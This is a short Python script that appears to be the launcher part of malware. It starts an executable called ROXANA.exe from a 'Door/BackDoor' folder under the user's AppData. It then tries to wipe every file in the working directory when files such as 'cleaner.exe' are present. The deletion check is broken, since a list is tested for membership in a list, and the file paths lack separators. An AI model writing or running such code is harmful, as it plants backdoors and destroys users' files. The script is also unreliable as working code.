
import os
import time

files = ['cleaner.exe', 'ROXANA.box', 'document.exe']

def scanner():
    current_dir = os.getcwd()
    file_list = os.listdir(current_dir)
    if files in file_list:
        for d_file in file_list:
            os.unlink(current_dir + d_file)

def run_thread():
    time.sleep(3)
    os.startfile(os.path.expanduser('~') + r'/AppData/Local/Door/BackDoor/ROXANA.exe')
    scanner()

if __name__ == '__main__':
    run_thread()
